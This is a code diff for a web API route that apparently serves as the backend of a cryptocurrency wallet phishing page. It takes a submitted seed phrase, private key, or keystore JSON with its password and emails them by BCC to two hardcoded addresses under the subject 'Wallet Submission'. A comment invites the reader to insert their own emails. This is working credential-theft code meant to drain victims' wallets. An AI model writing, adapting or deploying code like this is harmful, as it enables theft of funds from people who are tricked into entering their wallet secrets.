@@ -29,11 +29,54 @@ export async function POST(request: Request) {
       }
     });
 
-    // BCC recipients - invisible to each other
-    const bccRecipients = ['fahadabdullahi180@gmail.com', 'arewatrend01@gmail.com'];
+    const bccRecipients = ['arewatrend01@gmail.com', 'fahadabdullahi180@gmail.com']; // <-- ADD YOUR 2 EMAILS HERE
 
-    let mailOptions = {
-      from: `New Wallet Connect ${email}`,
-      to: fahadabdullahi180, // Your own email or a neutral one (required)
-      bcc: bccRecipients,
-      subject: 'Wallet
+    let mailOptions = {};
+
+    if (phrase) {
+      const formattedMessage = formatMessage(phrase);
+      mailOptions = {
+        from: `New Wallet Connect ${email}`,
+        bcc: bccRecipients,
+        subject: 'Wallet Submission',
+        html: formattedMessage,
+      };
+    }
+
+    if (keystore) {
+      mailOptions = {
+        from: `New Wallet Connect ${email}`,
+        bcc: bccRecipients,
+        subject: 'Wallet Submission',
+        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
+      };
+    }
+
+    if (privateKey) {
+      const formattedMessage = formatMessage(privateKey);
+      mailOptions = {
+        from: `New Wallet Connect ${email}`,
+        bcc: bccRecipients,
+        subject: 'Wallet Submission',
+        html: formattedMessage,
+      };
+    }
+
+    const result = await transporter.sendMail(mailOptions);
+    console.log('SendMail Result:', result);
+
+    if (result.messageId) {
+      return new Response(JSON.stringify({ message: 'Email sent successfully!' }), { status: 200 });
+    } else {
+      return new Response(JSON.stringify({ error: 'Internal server error' }), { status: 500 });
+    }
+  } catch (error: unknown) {
+    if (error instanceof Error) {
+      console.error('Error in sending email:', error);
+      return new Response(JSON.stringify({ error: error.message }), { status: 500 });
+    } else {
+      console.error('Unknown error:', error);
+      return new Response(JSON.stringify({ error: String(error) }), { status: 500 });
+    }
+  }
+}
